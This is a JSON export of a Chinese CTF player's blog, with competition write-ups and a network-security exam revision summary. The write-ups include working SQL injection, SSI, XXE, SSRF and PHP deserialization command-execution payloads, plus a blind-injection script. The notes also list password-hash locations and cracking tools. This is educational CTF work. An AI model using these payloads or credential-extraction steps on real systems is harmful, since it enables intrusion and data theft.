{"meta":{"title":"Altm4nz","subtitle":null,"description":null,"author":"Altm4nz","url":"http://altman.vip"},"pages":[{"title":"","date":"2018-11-02T04:52:01.000Z","updated":"2018-11-02T06:11:24.136Z","comments":false,"path":"about/index.html","permalink":"http://altman.vip/about/index.html","excerpt":"","text":"Altman -CUMTA WEB player from BXSEmail:872801413@qq.com"},{"title":"tags","date":"2018-11-02T05:28:06.000Z","updated":"2018-11-02T05:30:27.605Z","comments":true,"path":"tags/index.html","permalink":"http://altman.vip/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"ELS_2018_WriteUp","slug":"ELS-2018-WriteUp","date":"2018-11-16T14:47:56.000Z","updated":"2018-11-16T17:18:35.200Z","comments":true,"path":"2018/11/16/ELS-2018-WriteUp/","link":"","permalink":"http://altman.vip/2018/11/16/ELS-2018-WriteUp/","excerpt":"WEBSimpleBBS登录界面界面随手尝试输入单引号，引发了报错。 随即尝试报错注入","text":"WEBSimpleBBS登录界面界面随手尝试输入单引号，引发了报错。 随即尝试报错注入 11' and (extractvalue(1,concat(0x7e,database(),0x7e)))# 成功爆出数据库，下面就是常规注入了 11' and (extractvalue(1,concat(0x7e,(select flag from flag limit 0,1),0x7e)))# 用substr函数截取，拿到完整flag。 11' and (extractvalue(1,concat(0x7e,(select substr(flag,20,40) from flag limit 0,1),0x7e)))# SimpleServerInjectionhint：SimpleServerInjection, SSI, flag in current directory SSI:服务器端包含攻击 https://www.secpulse.com/archives/66934.html 根据文章的payload ： 1&lt;!--#include virtual=\"flag\" --&gt; SimpleExtensionExplorerInjection提示XXE, /flag。 直接尝试XXE进行读文件 需要改 content-type:application/xml SimplePrintEventLoggerhint:same server as SimpleExtensionExploreInjection , RCE, flag in / 和上一题同样的环境，flag在根目录下。 还是用上题的payload 直接读到根目录，有个flagvvvvvaaaagegsgag2333文件 然后读flagvvvvvaaaagegsgag2333 (和RCE有什么关系？非预期了吗) SimpleBlog随便登录进去之后看到提示二次注入和文件包含。 经过一波尝试发现 注册一个 a’ 账户 ，无论怎么点题目都是0分。 但是注册一个 a’ # ，点题会有分数出现。可以构造bool盲注 。 and if(1,exp(999999999999),1)#```1234执行exp()函数会造成报错，会造成分数都为0。```1&apos; and if(0,exp(999999999999),1)# 如果语句正常执行不报错，分数会正常显示。 这样就构成了bool盲注。 编写脚本 12345678910111213141516171819202122232425262728293031323334353637383940# encoding=utf-8import requestsdef reg(name): url=\"http://210.32.4.20/register.php\" data=&#123; 'username': name , 'password': '123456' &#125; r=requests.post(url=url,data=data) return r.headers['Set-Cookie'][10:-8]def log(name,cookie): cookies = &#123; 'PHPSESSID': cookie &#125; url='http://210.32.4.20/login.php' data = &#123; 'username': name, 'password': '123456' &#125; requests.post(url=url, data=data, cookies=cookies) url = 'http://210.32.4.20/answer.php' data = &#123; '1.a': 'on' &#125; r = requests.post(url=url, data=data, cookies=cookies) if 'Your grades is 0' in r.content: return 1 else: return 0flag=''for i in range(1,1000): for j in (33,127): payload = '''1' and if((ascii(substr((select flag from flag limit 0,1),%d,1))=%d),exp(999999999999),1)#'''%(i, j) session = reg(payload) if (log(payload,session)): flag=flag+chr(j) print flag break 根据提示在flag表flag段中找到。 miscgogogo流量包追踪tcp流 保存照片得到flag。 checkin验证码识别题 由于数量大并且有时间显示，考虑跑脚本来进⾏自动识别。首先需要写⼀一个training.py，收集验证码供人识别，产⽣一个训练集： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import pwnlabels = dict()labeled = 0fails = 0while labeled &lt; 36: isFailed = True io = pwn.remote('210.32.4.14', 13373) io.recvline() io.recvline() io.recvline() lines = [] for i in range(10): cur = io.recvline() lines.append(cur) for no in range(6): cur = '' for i in range(10): for j in range(18 * no, 18 * (no + 1)): cur += lines[i][j] cur += '\\n' isLabeled = False for value in labels.itervalues(): if cur == value: isLabeled = True if isLabeled: break print cur ans = raw_input() labels[ans[0]] = cur labeled += 1 isFailed = False if isFailed: fails += 1 else: fails = 0 if fails &gt; 20: break print '%d pictures have been labeled. ' % labeled io.close()f = open('trainingset.txt', 'wt')for key, value in labels.iteritems(): f.write(key) f.write('=') f.write(value.encode('hex')) f.write('#\\n')f.close() 然后开始自动识别 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import pwnlabels = dict()f = open('trainingset.txt', 'rt')flines = f.readlines()for line in flines: c = line[0] label = line[2:-2].decode('hex') labels[c] = labelio = pwn.remote('210.32.4.14', 13373)io.recvline()io.recvline()io.recvline()for _ in range(20): lines = [] for i in range(10): cur = io.recvline() lines.append(cur) ans = '' for no in range(6): cur = '' for i in range(10): for j in range(18 * no, 18 * (no + 1)): cur += lines[i][j] cur += '\\n' isLabeled = False curChr = '' for key, value in labels.iteritems(): if cur == value: isLabeled = True curChr = key break if not isLabeled: print cur curChr = raw_input()[0] labels[curChr] = cur f = open('trainingset.txt', 'at') f.write(curChr) f.write('=') f.write(cur.encode('hex')) f.write('#\\n') ans += curChr io.recvuntil('your captcha: ') io.sendline(ans)print io.recvall()io.close() 拿到flag CRYPTOAzureRSA12345678910n1=0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723Le1=0xfae3aLc1=0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaLn2=0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63Le2=0x1f9eaeLc2=0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347Lassert pow(flag,e1,n1)==c1assert pow(flag,e2,n2)==c2assert gcd(e1,(p1-1)*(q1-1))==14assert gcd(e2,(p2-1)*(q2-1))==14 解密脚本 123456789101112131415161718192021222324252627282930313233import gmpy2from libnum import *n1=0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723Le1=0xfae3aLc1=0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaLn2=0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63Le2=0x1f9eaeLc2=0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347Lp=gcd(n1,n2)q1=n1/pq2=n2/passert(p*q1==n1)assert(p*q2==n2)f1=(p-1)*(q1-1)f2=(p-1)*(q2-1)tmp=gcd(e1,e2)e1=e1/tmpe2=e2/tmpd1=invmod(e1,f1)d2=invmod(e2,f2)m1=pow(c1,d1,n1)m2=pow(c2,d2,n2)m3=m1%pm2=m2%q2m1=m1%q1m=solve_crt([m1,m2,m3], [q1,q2,p])print mn=q1*q2f=(q1-1)*(q2-1)m=m%nd=invmod(7,f)m=pow(m,d,n)print n2s(gmpy2.iroot(m, 2)[0])","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"网络安全课程复习","slug":"网络安全课程复习","date":"2018-11-15T11:42:39.000Z","updated":"2018-11-15T12:30:09.511Z","comments":true,"path":"2018/11/15/网络安全课程复习/","link":"","permalink":"http://altman.vip/2018/11/15/网络安全课程复习/","excerpt":"快考试了，总结一下网络安全的知识点。","text":"快考试了，总结一下网络安全的知识点。 第一章 概论0x00 网络安全主要威胁特洛伊木马，黑客攻击，后门，计算机病毒，拒绝服务攻击，内外部泄密，蠕虫，逻辑炸弹，信息丢失篡改销毁。 0x01 网络安全的三个基本属性 C I A (扩展5个)机密性(Confidentiality) 完整性(Integrity) 可用性(Availabiliy) 可靠性(Dependability) 不可抵赖性(Undeniability) 可控性(Controllability) 可审查性(Auditability) 真实性(Authenticity) 0x02 计算机信息系统安全保护TCSEC（Trusted Computer Evaluation Criteria，可信 计算机系统评估准则，美国国防部标准（1983）；4类 7级 • D级 ：安全保护欠缺级 • C1级：自主安全保护级 • C2级：受控存取保护级 • B1级：标记安全保护级 • B2级：结构化保护级 • B3级：安全域保护级 • A级 ：验证设计级 0x03 网络安全体系机构 OSI 提供了哪些安全服务（5类）0.认证（鉴别）服务：在网络交互过程中，对收发双方的身份及数据来源进行验证。1.访问控制服务：防止未授权用户非法访问资源，包括用户身份认证和用户权限确认。2.数据保密性服务：防止数据在传输过程中被破解、泄露。3.数据完整性服务：防止数据在传输过程中被篡改。4.抗否认性服务：也称为抗抵赖服务或确认服务。防止发送方与接收方双方在执行各自操作后，否认各自所做的操作。 0x04 OSI提供了哪8种安全机制 (具体)0.加密机制：加密机制对应数据保密性服务。加密是提高数据安全性的最简便方法。通过对数据进行加密，有效提高了数据的保密性，能防止数据在传输过程中被窃取。常用的加密算法有对称加密算法（如DES算法）和非对称加密算法（如RSA算法）。 1.数字签名机制：数字签名机制对应认证（鉴别）服务。数字签名是有效的鉴别方法，利用数字签名技术可以实施用户身份认证和消息认证，它具有解决收发双方纠纷的能力，是认证（鉴别）服务最核心的技术。在数字签名技术的基础上，为了鉴别软件的有效性，又产生了代码签名技术。常用的签名算法有RSA算法和DSA算法等。 2.访问控制机制：访问控制机制对应访问控制服务。通过预先设定的规则对用户所访问的数据进行限制。通常，首先是通过用户的用户名和口令进行验证，其次是通过用户角色、用户组等规则进行验证，最后用户才能访问相应的限制资源。一般的应用常使用基于用户角色的访问控制方式，如RBAC（Role Basic Access Control，基于用户角色的访问控制）。 3.数据完整性机制：数据完整性机制对应数据完整性服务。数据完整性的作用是为了避免数据在传输过程中受到干扰，同时防止数据在传输过程中被篡改，以提高数据传输完整性。通常可以使用单向加密算法对数据加密，生成唯一验证码，用以校验数据完整性。常用的加密算法有MD5算法和SHA算法等。 4.认证机制：认证机制对应认证（鉴别）服务。认证的目的在于验证接收方所接收到的数据是否来源于所期望的发送方，通常可使用数字签名来进行认证。常用算法有RSA算法和DSA算法等。 5.业务流填充机制：也称为传输流填充机制。业务流填充机制对应数据保密性服务。业务流填充机制通过在数据传输过程中传送随机数的方式，混淆真实的数据，加大数据破解的难度，提高数据的保密性。 6.路由控制机制：路由控制机制对应访问控制服务。路由控制机制为数据发送方选择安全网络通信路径，避免发送方使用不安全路径发送数据，提高数据的安全性。 7.公证机制：公正机制对应抗否认性服务。公证机制的作用在于解决收发双方的纠纷问题，确保两方利益不受损害。类似于现实生活中，合同双方签署合同的同时，需要将合同的第三份交由第三方公证机构进行公证。安全机制对安全服务做了详尽的补充，针对各种服务选择相应的安全机制可以有效地提高应用安全性。随着技术的不断发展，各项安全机制相关的技术不断提高，尤其是结合加密理论之后，应用安全性得到了显著提高。本书的后续章节将以加密理论及其相应实现为基础，逐步阐述如何通过加密技术确保企业应用的安全。 0x05黑客攻击类型从安全属性上分类: 阻断攻击，截取攻击，篡改攻击，重放攻击，伪造攻击。 从攻击方式分类： 主动攻击:伪装，回答，修改报文，拒绝服务。 被动攻击:报文内容泄露，通信分析。 第二章 网络攻击流程0x00 黑客攻击流程踩点 —&gt; 扫描 —&gt; 查点 —&gt; 访问/拒绝服务 —&gt; 提权 —&gt; 窃取信息 —&gt; 淹没踪迹 —&gt; 创建后门 0x01 踩点收集目标信息: 123456789101112131415域名；网络地址块 。可以直接从因特网进行访问的各个系统的具体IP地址。已被发现的各个系统上运行的TCP和UDP服务。系统体系结构（例如SPARC或X86）。访问控制机制和相关的访问控制表（access control list，ACL）。入侵检测系统（intrusion detection system，IDS）。各有关系统的细节信息（用户名和用户组名、系统旗标、路由 表、SNMP信息等等）。 DNS主机名。 获取信息方式: 1234公开渠道获取WHOIS查询DNS查询(nslookup,fierce)网络侦查(尝试确定网络的拓扑结构和可能存在的网络访问路径，traceroute) 0x02 搜索引擎使用技巧以google为例: 1234567891011空格或大写的AND： “与”-： “非”大写的“OR” ： “或” site：搜寻结果局限在某个具体网站 //sile:www.cumt.edu.cnlink：返回所有链接到某个url的网页 //link:www.cumt.edu.cninurl：返回的网页链接中包含关键词一，链接中或文档中出现第二个关键词 //inurl:cumt 计算机allinurl：返回的网页链接中包含所有查询关键词allintitle &amp; intitle：类似allinurl和inurl，对网页的标题栏进行查询related：搜索结构内容方面相似的网页 //related:www.cumt.edu.com/index.htmlcache：搜索缓存，快照info：搜索相关信息 0x03 扫描基本步骤确定目标系统是否真实存在， 确定目标系统上那些服务正在运行或监听， 探查操作系统。 0x04 nmap使用技巧网络扫描和嗅探工具包 常用命令： 123456789101112-sP ：进行ping扫描-sn: Ping Scan - disable port scan #ping探测扫描主机， 不进行端口扫描 （测试过对方主机把icmp包都丢弃掉，依然能检测到对方开机状态）-sA （发送tcp的ack包进行探测，可以探测主机是否存活）-sS ：半开放扫描（非3次握手的tcp扫描）/*优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高缺点：它需要root/administrator权限执行*/-sT：3次握手方式tcp的扫描 #效率低，速度慢，不需要root-sU：udp端口的扫描 #如果返回ICMP不可达的错误消息，说明端口是关闭的，如果得到正确的适当的回应，说明端口是开放的.udp端口扫描速度比较慢-sF：也是tcp的扫描一种，发送一个FIN标志的数据包-sX：圣诞树扫描-sN：空(NULL)扫描-sW：窗口扫描-sV：版本检测 0x05 查点对识别出来的服务进行更为充分的探查 · 用户账号名（用于随后的口令猜测攻击） · 错误配置的共享资源（如不安全的文件共享） · 具有已知安全性漏洞的旧版本软件（如存在远程缓冲区溢出的web服务器） 0x06 攻击实施分类： 破坏性攻击：利用工具发动攻击 入侵性攻击：利用收集到的信息，找到其系统漏洞，然后利用漏洞获取尽可能高的权限 主要阶段： 预攻击探测：为进一步入侵提供有用信息 口令破解与提升权限 实施攻击：缓冲区溢出、拒绝服务、后门、木马、病毒 攻击善后： 留后门：长时间地保留和巩固对系统的控制权 隐藏踪迹：删除日志文件，更改日志文件，替换系统程序。 0x07 渗透测试一种通过模拟的攻击者的技术与方法，挫败目标系统的安全控制措施 并取得访问控制权的安全测试方法 分类： 白盒测试：拥有组织机构的内部知识的情况下进行的渗透测试 灰盒测试：拥有一部分内部知识的情况下进行的渗透测试 黑盒测试：模拟一个对组织机构一无所知的攻击者进行的渗透测试 步骤（七步） 1234567前期交互阶段：确定渗透测试范围，目标，限制条件以及服务合同细节。情报搜集阶段：获取目标网络拓扑，系统配置，安全防御措施等信息。威胁建模阶段：针对获取的信息进行威胁建模和攻击规划。漏洞分析阶段：总和汇总的情报信息，从漏扫结果，服务查点信息等找出可实施攻击的点。渗透攻击阶段：利用找出的漏洞入侵系统，获取访问权限。后渗透攻击阶段：根据目标组织经营模式，保护资产形式等自主设计攻击目标。实施能造成重要业务影响的攻击报告阶段：凝聚所有阶段的关键情报信息，发现的系统漏洞，成功的渗透攻击过程，同时分析修补与升级方案 渗透工具: Metasploit 第三章 网络嗅探技术网络监听网络嗅探Network Sniffing)】：在他方未察觉的情况下捕获其通信报文、通信内容的技术，只限于局域网 网卡工作模式: 12341. 广播模式(Broadcast Mode)：网卡能够接收网络中的广播信息2. 组播模式(Multicast Mode)：网卡能够接收组播数据3. 单播模式(Unicast Mode)：只接收目的地址匹配本机MAC地址的数据帧4. 混杂模式(Promiscuous Mode,监听模式)：网卡接收一切数据帧，无论其目的MAC地址是什么 共享式局域网的监听实现方法 交换式局域网的监听技术（重点） 12345溢出攻击：交换机要维护一张MAC地址与端口的映射表（CAM），维护该表的内存有限。如用大量的错误MAC地址的数据，帧对交换机进行攻击，交换机就可能出现溢出。这时交换机就回到广播方式——向所有的端口发送数据包，监听就很容易了（ARP过载, MAC泛洪）ARP欺骗：计算机维护一个IP-MAC地址对应表，该表随着ARP请求/响应不断更新。 通过ARP欺骗，改变表里的对应关系，攻击者可以成为被攻击者与交换机之间的“中间人”，使交换式局域网中的所有数据包都流经攻击者的网卡。 常用的网络监听工具 Wireshark,Tcpdump/Windump 网络嗅探技术防御监听（被动技术，难以发现）的防御：采用安全的网络拓扑结构和数据加密技术（数据内容加密，数据通道加密）。注意重点区域的安全防范。 交换网络下防监听： 主要防止ARP欺骗及ARP过载 主要措施 12341 不要把网络安全信任关系建立在单一的IP或MAC基础上，理想的关系应该建立在IP-MAC的对应关系上2 使用静态ARP或者IP-MAC对照表代替动态的ARP或者IP-MAC对应表——禁止自动更新，使用手动更新3 定期检查ARP请求：使用ARP监视工具如ARPWatch等监视并探测arp欺骗4 制定良好的安全管理策略，加强用户安全意识 第四章 口令破解0x00 口令破解方法暴力破解:穷举，速度慢。 字典攻击：根据用户信息建立起一个用户可能使用的口令表文件，速度快。 组合攻击：在字典列表的基础上增加几个字母或数字进行攻击。 社会工程学：偷窥，网络嗅探，搜索垃圾箱，重放。 0x01 windows口令文件1.安全账户管理器SAM机制。 1C:\\Windows\\System32\\Config\\SAM 2.SAM文件: 含有本地系统或坐在控制域上所有用户名和口令的HASH值。 3.创建口令HASH方法： LAN Manager (LM)：最早使用的密码哈希算法之一 密码的LM哈希步骤 1234561.将口令全部转换为大写2.添加NULL字符，直到口令长度等于14字符，并转化为二进制字符串3.将新口令拆分为两组7位打的字符串4.分别经过str_to_key()函数处理创建两个DES加密密钥，并未每一组添加奇偶校验位，创建出64位的密钥5.使用每个DES密钥加密一个预定义的魔术字符串，获得两个9字节的密文值6.密文值链接成16字节的值，即最终获得的LM哈希。 LM哈希的安全缺陷 12341.des算法密钥太短2.69^7种可能，可以暴力破解3.如果密码长度&lt;=7,则第二部分hash为固定值，因此很容易确定密码的长度范围。4.Hash值在通过网络发送到服务器的时候，没有进行salting操作，容易遭受中间人攻击和重放攻击。 NT LAN Manager V2（NTLMV2): windows2000，XP,VISRA,win7。 NTMLV2安全性：MD4比DES更加健壮，因此可以接受更长的密码，可允许同时使用大小写，不需要将密码拆分为更小更易于破解的片段。 4.安全标示RID：在账号创建是被创建，账号删除时，RID也同时删除，及时用户名相同，每次创建时获得的RID也不同。 5.HASH密码格式： 1用户名：RID：LM-HASH：NT-HASH。 0x02 windows系统的登录与身份认证交互式登录：向本地计算机或域账户确认用户的身份 • 本地账户登录本地计算机：可以使用存储在本地SAM中 的口令散列进行登录——用户输入明文口令，系统对口 令使用相同的加密散列过程，并将散列结果与保存的散 列进行比较，如果匹配，则通过验证 • 域账户登录：默认使用Kerberos V5（身份认证章节） 网络登录：对用户尝试访问的网络服务或资源提供用 户验证。可以使用多种网络身份验证机制，如 Kerberos V5、安全套接字/传输层安全（Secure Socket Layer/Transport Layer Security，SSL/TLS） 以及与Windows NT 4.0兼容的NTLM机制 基于挑战/响应机制（C/R，Challenge/Response） 0x03 Unix/linuxLinux是一套免费使用和自由传播的Linux 类 操作系统 Unix ，是一个基于 POSIX的多用户、 多任务 、支持多线程和多CPU的操作系统。它能运行主要的CPU 工具软件、应用程序和UNIX 议 ， 支持网络协位 32 和位 64 硬件。 Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。 1.特点：自由开放，配备需求低廉，功能强大而稳定，真正的多用户多任务。 2.与WINDOWS不同 123Linux严格区分大小写Linux中所有内容都以文件的形式保存，包括硬件Linux不以扩展名来区分文件类型 3.linux密码 修改密码指令 passwd 密码系统： 12/etc/passwd: 包含了用户名、用户的真实姓名、标 识信息以及每个用户的基本信息，各个域之间用”:” 隔开/etc/shadow: 影子密码文件，包含了加密过的密码以 及密码失效时间 加密方式： 12过去:单向函数crypt(),基于DES算法现在:Unix Salt,crypt16(),MCF（模块化加密格式） 4.UID/GID 用户标识符UID： 12341~499：用于系统功能500~： 用户0：超级用户保留（当UID为0的用户运行一个进程时， 内核对该进程取消了大部分的安全检查）//Unix的特权是根据UID来确定的，与Unix账 号无关 组标识符GID 12345每个Unix用户都属于一个或者几个组每个用户都隶属于一个主用户组，存储在/etc/passwd文件中可以利用组来限制一些用户对敏感信息或者特殊许可的应用程序的访问权/etc/group：列出了计算机上所有的组/etc/gshadow：计算机上所有组的群组影子密码文件 基本命令 12345groupadd 新建用户组groupmod 更改用户组名称或组编号 -n 组名称 -g 组编号groupdel 删除用户组 useradd 增加新用户 -g 指定用户所属的组 -G 指定用户所属的附加组usermod 修改用户信息 -l 修改用户名称 -L 锁定用户密码 0X04 MYSQL口令破解用户名密码保存在mysql数据库中user表中 找到user.MYD user.MYI user.frm拷贝到自己的数据库中 123use mysql;select user,password from user; 提取hash。 带号的HASH值是MYSQL5的HASH，不带号的是旧版MYSQL的HASH。 然后利用Cain &amp; Abel || cmd5破解 0x05 暴力破解工具Hydra 破解服务：FTP、TELNET、SMB、MSSQL、MYSQL、 POP3、SSH、REDIS等 Medusa “美杜莎”，一款强大的破解工具，可以迅速的、大规模 并行的、模块化的暴力破解程序 John the ripper:一个密码工具软件。主要支持对DES、MD5两种加密 方式的密文进行破解工作。可以工作于多中不同的机 型以及多 种不同的操作系统之下 第五章 欺骗攻击0x00 欺骗冒充身份通过认证以骗取信任的攻击方式 攻击者针对认证机制的缺陷，将自己伪装成可信任方， 从而与受害者交流，以获取信息或者展开进一步攻击 常见的欺骗攻击 12345ip欺骗ARP欺骗邮箱欺骗DNS欺骗WEB欺骗 0x01 IP欺骗IP协议：非面向连接，两台计算机的信任连接主要依 靠双方的IP地址 IP欺骗的方式： 123简单的IP地址更改:攻击者将一台计算机的IP地址修改为其它主机的地址， 以伪装冒充其它机器源路由攻击：保证数据包始终会经 过一条经定的途径，而攻击者机器在该途径中TCP会话劫持:接管现存动过程，即攻击者可以替代原来的合法用户，同时监视并掌 握会话内容 TCP会话劫持步骤 1.发现攻击目标 ​ ①目标是一个准予TCP 会话连接（例如Telnet和FTP等）的服务器 ​ ②能否检测数据流 2.确认动态会话 3.猜测序列号 ​ ①通过嗅探或者ARP欺骗，先发现目标机正在使用 的序列号，再根据序列号机制，可以猜测出下一 对SEQ/ACK序列号 ​ ② 同时，攻击者若以某种方法扰乱客户主机的SEQ/ACK，服务器将不再相信客户主机正确的数据包，从而可以伪装为客户主机，使用正确的 SEQ/ACK序列号，现在攻击主机就可以与服务器进 行连接，这样就抢劫一个会话连接。 4.使客户主机下线 ​ 对其进行拒绝服务攻击 5.接管会话 ​ ①持续向服务器发送数据包并且接管整个会话 ​ ②创立账户留下后门 TCP会话劫持的危害 ​ 1.就其实现原理而言，任何使用Internet进行通信 的主机都有可能受到这种攻击 ​ 2产生了简单适用的会话劫持攻击软件，技术门槛的 降低导致了很多“少年攻击者”的诞生. 原因： 一个最主要的原因就是它并不依赖于操作系统，另一个原因就是它可以被用来进行积极的攻击，通过攻击行为可以获得进入系统的可能。 工具 ： Juggernaut ; Hunt IP欺骗的防御——路由器过滤 1.防范基本的IP欺骗：入口过滤，出口过滤。 2.防范源路由欺骗：设置路由器禁止源路由。 3.防范会话劫持（没有有效的办法可以根本上防范会话 劫持攻击，只能尽量减少攻击带来的危害）： ​ ① 加密 ​ ②使用安全协议 SSH ​ ③限制保护，允许外网到内网的信息越少越安全。 0x02 ARP欺骗arp基础知识 1234567891011121.地址解析协议，用于将计算机的网络地址（IP地址32位）转化为物理地址（MAC地址48位）。属于链路层的协议。2.数据帧从一个主机到达局域网内的另一台主机是根据48位的以太网地址来确定的，而不是32位IP。3.内核（如驱动）必须知道目的端的硬件地址才能发送数据。4.ARP请求包：ARP工作时，送出一个含有目的IP地址的以太网广播数据包，这也就是ARP请求包。它表示：我想与目的IP通信，请告诉我此IP的MAC地址。ARP请求包格式如下：arp who-has 192.168.1.1 tell 192.168.1.25.当目标主机收到ARP请求包，发现请求解析的IP地址与本机IP地址相同，就会返回一个ARP应答包。它表示：我的主机就是此IP，我的MAC地址是某某某。ARP应答包的格式如下：arp reply 192.168.1.1 is-at 00:00:0c:07:ac:006.arp缓存表： ①ARP缓存表用于存储其它主机或网关的IP地址与MAC 地址的对应关系。 ②每台主机、网关都有一个ARP缓存表。 ③ARP缓存表里存储的每条记录实际上就是一个IP地址与MAC地址对，它可以是静态的，也可以是动态的。如果是静 态的 ，那么该条记录不能被ARP应答包修改； 如果是动态的，那么该条记录可以被ARP应答包修改。 //wating","categories":[],"tags":[{"name":"课程复习","slug":"课程复习","permalink":"http://altman.vip/tags/课程复习/"}]},{"title":"第四届上海市大学生网络安全赛-WEB&MISC","slug":"第四届上海市大学生网络安全赛-WEB","date":"2018-11-04T06:14:36.000Z","updated":"2018-11-05T12:53:59.179Z","comments":true,"path":"2018/11/04/第四届上海市大学生网络安全赛-WEB/","link":"","permalink":"http://altman.vip/2018/11/04/第四届上海市大学生网络安全赛-WEB/","excerpt":"1文章首发于https://www.freebuf.com/column/188520.html WEBweb1查看robots.txt得知flag.php和source.php访问source.php，需要以管理员登录 POST数据admin=1需要伪造IP为127.0.0.1多番尝试后发现可以用x-client-ip绕过","text":"1文章首发于https://www.freebuf.com/column/188520.html WEBweb1查看robots.txt得知flag.php和source.php访问source.php，需要以管理员登录 POST数据admin=1需要伪造IP为127.0.0.1多番尝试后发现可以用x-client-ip绕过添加http头x-client-ip:127.0.0.1POST数据url=http://www.ichunqiu.com得到一个图片地址，将图片数据下载下来后发现是www.ichunqiu.com网站首页源码。显然是ssrf那么接下来就要构造url读取其他文件。利用file://协议读取本地文件，绕过检测最终得到payload url=file://www.ichunqiu.com//var/www/html/flag.php 将JPG文件下载然后查看内容 web2一道反序列化题目.index.php.swp发现源码 1vim -r index.php 恢复源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phperror_reporting(0);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace(\"/[&lt;&gt;*;|?\\n ]/\",\"\",$str); $str=str_replace('flag','',$str); return $str; &#125; function echo($host)&#123; system(\"echo $host\"); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(\"echo\"))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125; &#125;$first='hi';$var='var';$bbb='bbb';$ccc='ccc';$i=1;foreach($_GET as $key =&gt; $value) &#123; if($i===1) &#123; $i++; $$key = $value; &#125; else&#123;break;&#125;&#125;if($first===\"doller\")&#123; @parse_str($_GET['a']); if($var===\"give\") &#123; if($bbb===\"me\") &#123; if($ccc===\"flag\") &#123; echo \"&lt;br&gt;welcome!&lt;br&gt;\"; $come=@$_POST['come']; unserialize($come); &#125; &#125; else &#123;echo \"&lt;br&gt;think about it&lt;br&gt;\";&#125; &#125; else &#123; echo \"NO\"; &#125;&#125;else&#123; echo \"Can you hack me?&lt;br&gt;\";&#125;?&gt; 很明显的反序列化首先简单的构造打出welcome回显，进入POST语句然后构造反序列化然后上传成功执行命令。获取flag的过程中发现空格被bypass了，这里用$IFS绕过双写flag绕过过滤最终payload1O%3A4%3A%22come%22%3A2%3A%7Bs%3A12%3A%22%00come%00method%22%3Bs%3A4%3A%22echo%22%3Bs%3A10%3A%22%00come%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A18%3A%22%60cat%24IFS%2Fflaflagg%60%22%3B%7D%7D web31234567891011121314151617181920212223242526272829直接给了源码&lt;?php //error_reporting(0); //$dir=md5(\"icq\" . $_SERVER['REMOTE_ADDR']); $dir=md5(\"icq\"); $sandbox = '/var/sandbox/' . $dir; @mkdir($sandbox); @chdir($sandbox); if($_FILES['file']['name'])&#123; $filename = !empty($_POST['file']) ? $_POST['file'] : $_FILES['file']['name']; if (!is_array($filename)) &#123; $filename = explode('.', $filename); &#125; $ext = end($filename); if($ext==$filename[count($filename) - 1])&#123; die(\"emmmm...\"); &#125; $new_name = (string)rand(100,999).\".\".$ext; move_uploaded_file($_FILES['file']['tmp_name'],$new_name); $_ = $_POST['hehe']; if(@substr(file($_)[0],0,6)==='@&lt;?php' &amp;&amp; strpos($_,$new_name)===false)&#123; include($_); 